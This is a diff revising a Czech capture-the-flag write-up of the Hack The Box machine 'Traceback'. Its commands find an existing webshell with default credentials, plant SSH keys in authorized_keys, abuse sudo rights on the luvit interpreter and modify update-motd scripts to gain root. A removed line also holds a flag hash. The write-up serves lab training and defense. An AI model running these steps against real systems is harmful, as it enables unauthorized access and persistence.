@@ -7,113 +7,143 @@ tags: linux rce ssh sudo php exploit
 ---
 ## Úvod a kontext
 
-Traceback dobře ukazuje, že průlom často nezačíná jedním exploitem, ale kombinací signálů jako Apache a SSH.
+Traceback nezačíná nalezením nové zranitelnosti, ale rozpoznáním známého webshellu, který už na serveru běží. To je samo o sobě dobré připomenutí, že při incident response nebo pentestu nemusí být prvním cílem „najít exploit“, ale pochopit, co na hostu zůstalo po předchozí kompromitaci.
 
-Praktická část pak stojí na tom, jak se tyto zjištěné vazby promění v SSH s nalezenými přihlašovacími údaji a jak je po user části využitelná příliš široká `sudo` oprávnění.
+Další postup je pak čisté řetězení špatně delegovaných práv. Webshell otevře účet `webadmin`, ten může přes `sudo` spouštět interpret `luvit` jako `sysadmin`, a `sysadmin` zase může upravovat skripty v `/etc/update-motd.d`, které se spouštějí jako root při každém přihlášení.
 
 ## Počáteční průzkum
 
 ### Vyhledání otevřených portů
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+Nejdřív ověřuji, jak malá je veřejná plocha stroje.
+
 ```bash
 ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
 ```
-```
+
+```text
 PORT   STATE SERVICE VERSION
-```
-
-### Detailní analýza služeb
-
-V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
-```text
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-```
-```
-| ssh-hostkey:
-|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
-|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
-|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-methods:
-|_  Supported Methods: HEAD GET POST OPTIONS
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Help us
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## Získání přístupu
+Web na portu `80` vypadal nezajímavě, ale v HTML zdroji byla podstatná nápověda:
 
-### Spuštění exploitu
-
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
 ```text
-HTML Source Code
-```
-```
-=> Some of the best web shells that you might need
-=> https://github.com/TheBinitGhimire/Web-Shells
+Some of the best web shells that you might need
+https://github.com/TheBinitGhimire/Web-Shells
 ```
 
-### Přihlášení na cíl (2)
+To je silný hint, že na hostu může být některý z veřejně známých webshellů už nasazený.
 
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+## Analýza zjištění
+
+### Nalezení `smevk.php`
+
+Z relevantních kandidátů se rychle potvrdil `smevk.php`:
+
 ```text
 http://10.10.10.181/smevk.php
 ```
+
+Přihlašovací údaje byly ponechané v defaultní podobě:
+
+```text
+admin:admin
 ```
-=> admin:admin
+
+Jakmile takový webshell funguje, nemá smysl zůstávat u webového rozhraní déle, než je nutné. Hlavní cíl je přejít na stabilní SSH přístup.
+
+## Získání přístupu
+
+### Přechod na `webadmin`
+
+Přes webshell šlo zapsat vlastní veřejný klíč do účtu `webadmin`:
+
+```bash
 echo "ssh-rsa __CENSORED__== hack@t" >> /home/webadmin/.ssh/authorized_keys
 ```
 
-### Získání user flagu
+Tím vznikl SSH přístup:
 
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+```bash
+ssh webadmin@$IP
+```
 
-Následující úsek zachycuje přechod k uživatelskému přístupu a jeho ověření přes `user.txt`.
+### `luvit` jako `sysadmin`
+
+Další důležitý výstup byl:
+
+```bash
+sudo -l
+```
 
 ```text
-ssh 2
+(sysadmin) NOPASSWD: /home/sysadmin/luvit
+```
+
+`luvit` je Lua runtime pro Node-like skripty, takže nejde o neškodný pomocný binární soubor, ale o interpret schopný spouštět příkazy. To znamená, že jeho spuštění jako `sysadmin` je v praxi přímý code execution v tomto kontextu.
+
+Praktický přechod vypadal takto:
+
+```bash
+sudo -u sysadmin /home/sysadmin/luvit
+```
+
+Uvnitř šlo přes `childprocess.exec` přidat vlastní klíč do `sysadmin/.ssh/authorized_keys`:
+
+```javascript
+childprocess.exec('echo "ssh-rsa __CENSORED__== hack@t" >> /home/sysadmin/.ssh/authorized_keys', print)
+```
+
+Pak už stačilo přihlášení:
+
+```bash
 ssh sysadmin@$IP
+```
 
+A potvrzení user flagu:
+
+```bash
 cat user.txt
-069e269894656f6145043abf4dcef9da
+```
 
-vi /etc/update-motd.d/00-header
-
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8+QR3hnONfIO2Y/vhoVRgVDpeOUrpxa+EOnRNhAV9/dYNoi/hOn0TTNcf0I5ws2UXkJAZsjH6IRImyRSDA5ly8K8lYqTyWRUGU1EGZ2ovlR2fjzOTaeuKY8VylnwQzQBNrFPoDZ6uKjpORoRszHQf9WzrtZ8M+zcpGO0MLPiuEl78INxwii7y94CAn1gl+xlrIgKAF3inpuTlaLvEljLe1JgsYKJIcZNplYgA9pcDx7HWFceyAUwpdc438kTiANtmz6863mjfuoZ1LQ9mK8pmR010L9eQhO8FGq15Hpru0AJzIuTNoEJKYsdBG6ttfQ4DLmey6h0IE5IkcqrfH9gAweGIJ68zn3Xh1GP9CWO8iKxkMZPemr5GhBKB1mr0ebCjuWwxzmzmzeBcIm6PlSkkt5iULsgdgsvu/ptFIFGVukajnihbK/b3uWCDtaJcgaSILoSomouxjfXqmAwj/TaM0qHsT7K9NZsPfOB5ZAXa2spPR+AGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl+pmlehyW1Pl0RKi5eXxEQHZQddlDbpcwk6K9GVA04juJce5odDeWk0TUuxTgU2y1jnGnvQZSizjl6YcRXUNDXF2H/tFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw+ppfkBwBIs1Q== hack@t" >> /root/.ssh/authorized_keys
+```text
+__CENSORED__
 ```
 
 ## Eskalace oprávnění
 
-### Průzkum možností eskalace
+### Zapisovatelný `update-motd`
 
-Hledám chybné konfigurace a cesty k vyšším oprávněním.
+Na účtu `sysadmin` byla nejdůležitější schopnost zapisovat do `/etc/update-motd.d/`. Tyto skripty nejsou jen kosmetika pro banner po přihlášení. `pam_motd` je spouští jako root při každém loginu.
+
+To z nich dělá ideální privesc vektor: pokud lze změnit obsah skriptu a následně vyvolat nové SSH přihlášení před obnovou původního stavu, spustí se útočníkův kód jako root.
+
+Prakticky stačilo upravit například `00-header` a přidat příkaz, který zkopíruje `sysadmin` klíč i rootovi:
+
 ```bash
-sudo -l
-```
-```
-=>     (sysadmin) NOPASSWD: __CENSORED__
+echo "cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/" >> /etc/update-motd.d/00-header
 ```
 
-### Získání root flagu
+Pak už stačí okamžitě otevřít nové SSH spojení. Při loginu se modifikovaný MOTD skript vykoná jako root a zkopíruje klíč do `/root/.ssh/authorized_keys`.
 
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+Následně je možné se přihlásit jako root:
+
 ```bash
-cat root.txt
+ssh root@$IP
 ```
-```
-__CENSORED__
-```
+
+A přečíst `root.txt`.
 
 ## Shrnutí klíčových poznatků
 
-- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako Apache a SSH.
-- User část stála na ověřeném kroku typu SSH s nalezenými přihlašovacími údaji, ne na odhadu bez technického potvrzení.
-- Závěrečná eskalace pak stála na tom, co představuje příliš široká `sudo` oprávnění, takže rozhodující byla práce s lokálním kontextem po footholdu.
+- První foothold zde nepřišel z nové exploitační techniky, ale z rozpoznání veřejně známého webshellu s ponechanými defaultními přihlašovacími údaji.
+- Přechod z `webadmin` na `sysadmin` nestál na kernelové chybě, ale na právu spouštět interpret `luvit` přes `sudo`.
+- Root část byla důsledkem zapisovatelných skriptů v `update-motd`, které root automaticky spouští při přihlášení.
 
 ## Co si odnést do praxe
 
-- Tento řetězec začal u Apache a SSH; právě tam má obrana největší návratnost. Převod dokumentů a server-side render je potřeba sandboxovat a oddělit od citlivého filesystemu; parser nebo převodník nesmí mít přístup k tajemstvím hostu.
-- Foothold navázal na SSH s nalezenými přihlašovacími údaji, takže oddělení účtů a tajemství není jen teorie. Hesla a klíče je potřeba oddělovat mezi službami; jakmile stejné přihlašovací údaje fungují i na SSH, z lokálního úniku je plnohodnotný systémový přístup.
-- Poslední krok stojí na příliš široká `sudo` oprávnění, a proto je nutné auditovat i lokální delegaci práv. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
+- Známé webshelly je potřeba detekovat i jednoduchými IOC: názvy souborů, charakteristické rozhraní a defaultní přihlašovací údaje. Pokud už na serveru běží, hledání další CVE je až druhý krok.
+- `sudo` právo spouštět interpreter je prakticky stejné jako právo spouštět shell. U Lua, Pythonu, Node, PHP CLI nebo podobných nástrojů je to potřeba hodnotit jako code execution.
+- Skripty v `update-motd.d` a podobných login hookech jsou bezpečnostně citlivé. Pokud je může měnit neprivilegovaný uživatel, přihlášení se samo změní v root trigger.
